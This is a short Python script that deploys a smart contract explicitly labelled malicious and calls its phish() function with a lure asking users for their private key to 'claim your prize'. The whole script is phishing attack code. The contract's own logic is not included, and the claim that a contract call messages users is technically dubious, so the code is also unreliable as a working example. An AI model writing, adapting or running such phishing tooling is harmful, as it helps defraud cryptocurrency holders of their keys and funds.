from web3 import Web3
import json

# Connect to Ethereum node
w3 = Web3(Web3.HTTPProvider('http://localhost:8545'))

# Load malicious contract ABI and bytecode
with open('PhishingContract.json') as f:
    contract_data = json.load(f)
malicious_abi = contract_data['abi']
malicious_bytecode = contract_data['bytecode']

# Deploy malicious contract
def deploy_contract(abi, bytecode):
    contract = w3.eth.contract(abi=abi, bytecode=bytecode)
    tx_hash = contract.constructor().transact()
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    return w3.eth.contract(address=tx_receipt.contractAddress, abi=abi)

phishing_contract = deploy_contract(malicious_abi, malicious_bytecode)

# Simulate phishing attack
def perform_phishing_attack(phishing_contract):
    # Send phishing message to users
    phishing_message = "Please enter your private key to claim your prize!"
    tx_hash = phishing_contract.functions.phish(phishing_message).transact()
    w3.eth.wait_for_transaction_receipt(tx_hash)
    
    # Check phishing status
    status = phishing_contract.functions.getStatus().call()
    print(f"Phishing Status: {status}")

perform_phishing_attack(phishing_contract)
